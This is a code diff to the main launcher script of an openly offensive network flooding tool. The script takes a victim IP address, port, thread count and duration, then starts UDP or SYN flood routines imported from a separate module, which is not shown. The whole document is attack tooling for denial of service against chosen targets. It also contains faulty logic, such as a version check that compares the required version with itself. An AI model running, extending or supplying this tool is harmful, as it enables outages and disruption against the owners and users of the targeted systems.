@@ -1,5 +1,15 @@
 import optparse, asyncio
-from savitr.zeus import strike
+
+from os import system
+from sys import version,stdout
+from socket import gethostbyaddr
+
+try:
+    from savitr.zeus import udp_strike, syn_strike
+except ImportError:
+    stdout.write("\n[!!]\tWas unable to import 'zeus.py' from directory 'shiva/savitr'")
+    raise SystemExit
+
 
 #sudo python3 main.py -v 127.0.0.1 -d 80 -m UDP -t 60 -p 3
 
@@ -8,15 +18,15 @@ usage = """\n\n
 Example: -v 127.0.0.1 -d 80 -m udp -t 10 -p 6 -s .4  (Does not need to be in order)
 
 Options: (everything but victim has a default value if not given one)
- ______________________________________________________________
-|                                                              |
-|-v, --victim      | The IP address.                           |
-|-d, --destination | The targeted Port number.                 |
-|-m, --method      | The attack Method.                        |
-|-p, --processes   | The Thread count.                         |
-|-t, --time        | The attack Time length in second(s).      |
-|-s, --sleep       | The time between each packet in second(s).|
-|______________________________________________________________|
+ ________________________________________________________________
+|                                                                |
+|-v, --victim      | The IP address.                             |
+|-d, --destination | The targeted Port number.                   |
+|-m, --method      | The attack Method.                          |
+|-p, --processes   | The Thread count.                           |
+|-t, --time        | The attack Time length in second(s).        |
+|-s, --sleep       | The time between each packet in second(s).  |
+|________________________________________________________________|
  """
 
 parser = optparse.OptionParser(description="User options", usage=usage)
@@ -81,13 +91,12 @@ parser.add_option(
     help='time between each packet sent in second(s).'
 )
 
-NULLVALUE = False
 
 try:
     (options, args) = parser.parse_args()
 except optparse.OptParseError as e:
 
-    print ('\n[!!]\tUnable to parse arguments.')
+    stdout.write('\n[!!]\tUnable to parse arguments.')
     raise SystemExit
 
 ARGUMENT_DIC = {
@@ -100,31 +109,71 @@ ARGUMENT_DIC = {
     'sleep': options.sarg
 }
 
+VERSION = {
+
+    'required': [3,5,0,'3.5.0'],
+    'user_version': version[0:6],
+}
+
 
 usr_opt = """\n\n
-Victim  | {victim/IP address}
+REVIEW: Option(s) not given a value are defaulted
+
+Victim  | {victim/IP address} // {}
+_______________________________
+
 Port    | {destination/Port}
+_______________________________
+
 Method  | {method/UDP,SYN}
+_______________________________
+
 Threads | {threads}
+_______________________________
+
 Time    | {time/Seconds}
+_______________________________
+
 Sleep   | {sleep}
-""".format(**ARGUMENT_DIC)
+""".format(gethostbyaddr(ARGUMENT_DIC['victim/IP address']), **ARGUMENT_DIC)
+
+
+#   TODO // Add a method that checks if the host is online and that the desired port to flood is open.
+
+
+def check_compatability():
+    'checks if user machine has proper file(s) to run this script.'
+
+    if VERSION['required'][0] < 3 and VERSION['required'][1] < 5:
+
+        print ("\n[!!]\tMissing required Python version!\n"
+               "*\tMust have version {required[3]}+\n"
+               "*\tYou have version {user_version}".format(**VERSION)); raise SystemExit
 
 
 
 def main():
 
-    print (usr_opt); input("\nPRESS ENTER TO CONTINUE. (Ctrl+z to exit)")
+    stdout.write(usr_opt); input("\nPRESS ENTER TO CONTINUE. (Ctrl+z to exit)")
 
-    loop = asyncio.get_event_loop()
+    if ARGUMENT_DIC['method/UDP,SYN'] == 'udp'.casefold():
 
-    loop.run_until_complete(strike(**ARGUMENT_DIC))
-    loop.close()
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(udp_strike(**ARGUMENT_DIC))
+        loop.close()
 
+    elif ARGUMENT_DIC['method/UDP,SYN'] == 'syn'.casefold():
+
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(syn_strike(**ARGUMENT_DIC))
+        loop.close()
 
 
 
 
 if __name__ == '__main__':
     'execute'
-    main()
+
+    check_compatability()
+    system("clear");main()
+
